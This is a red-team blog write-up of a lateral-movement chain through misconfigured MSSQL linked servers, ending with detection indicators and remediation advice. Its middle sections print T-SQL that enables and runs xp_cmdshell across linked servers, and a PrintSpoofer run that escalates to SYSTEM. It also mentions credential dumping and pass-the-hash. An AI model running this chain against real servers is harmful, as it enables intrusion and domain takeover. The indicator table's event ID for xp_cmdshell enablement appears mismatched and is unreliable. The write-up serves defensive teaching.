Lateral Movement Through Misconfigured MSSQL Linked Servers

How a single developer mistake in a database linkage gave me keys to the entire corporate forest — from low-privilege domain user to domain admin in under four hours.

0xd3x73r · 2025-01-10 · ~12 min read · Field Notes
Red Team MSSQL Active Directory Lateral Movement Privesc

Overview

During a recent red team engagement, I encountered a textbook misconfiguration that transformed a low-privilege SQL login into full domain compromise. What started as a routine internal assessment turned into one of the cleanest lateral movement chains I've executed in a production environment.

⚠

Authorized penetration testing and educational purposes only. All activities performed within scope of a signed engagement.

The target: a mid-sized financial firm with heavily segmented network. My initial foothold was a workstation-level meterpreter session — a domain user with no special privileges.

Initial Discovery

After establishing persistence, I turned to internal reconnaissance. BloodHound collection revealed MSSQL servers with unusual inter-connectivity.

Enumerating SQL Linked Servers

With a low-privilege domain account, I interrogated linked server configurations:

T-SQL-- Enumerate all linked servers
SELECT name, product, provider, data_source
FROM sys.servers WHERE is_linked = 1;

EXEC sp_linkedservers;

Output: SQLSRV-DEV → SQLSRV-PROD → SQLSRV-FINCORE. The finance core server was on a segment with no direct network access from my position.

ℹ

SQL Server linked server connections often use sa credentials configured decades ago. The security context can far exceed developer intent.

Exploitation Chain

The linked server used a SQL login with sysadmin privileges on the remote server.

T-SQLSELECT * FROM OPENQUERY([SQLSRV-PROD],
  'SELECT * FROM OPENQUERY([SQLSRV-FINCORE],
    ''SELECT SYSTEM_USER, IS_SRVROLEMEMBER(''''sysadmin'''')'')');

Result: SA_SVC_FINCORE | 1. Sysadmin confirmed. Enabling xp_cmdshell:

T-SQLEXEC ('sp_configure ''show advanced options'', 1; RECONFIGURE;
       sp_configure ''xp_cmdshell'', 1; RECONFIGURE;') AT [SQLSRV-PROD];

EXEC ('xp_cmdshell ''whoami /all''') AT [SQLSRV-PROD];

Token Theft → SYSTEM

The SQL service account had SeImpersonatePrivilege. PrintSpoofer escalated to SYSTEM:

CMDC:\> PrintSpoofer64.exe -i -c cmd
[+] Found privilege: SeImpersonatePrivilege
[+] CreateProcessAsUser() OK
C:\Windows\system32> whoami
nt authority\system

Domain Admin in 4 Hours

From SYSTEM, LSA secret extraction revealed cached domain admin credentials. Pass-the-hash to the domain controller closed the loop.

The scariest attacks aren't zero-days. They're the decade-old misconfigurations quietly waiting in production.

IOCs & Detection

IndicatorTypeDescription
xp_cmdshell enableEvent ID 18456SQL config change — almost always malicious
OPENQUERY lateral callsSQL TraceCross-server queries from non-app accounts
PrintSpoofer executionSysmon EID 1Spool service abuse

Remediation

  • Audit all linked server configs — disable anything unused
  • Never configure linked servers with sysadmin accounts
  • Disable xp_cmdshell on all production SQL instances
  • Ship SQL Server Audit logs to SIEM with alert rules
✓

Run SELECT * FROM sys.servers WHERE is_linked = 1 in your environment right now.
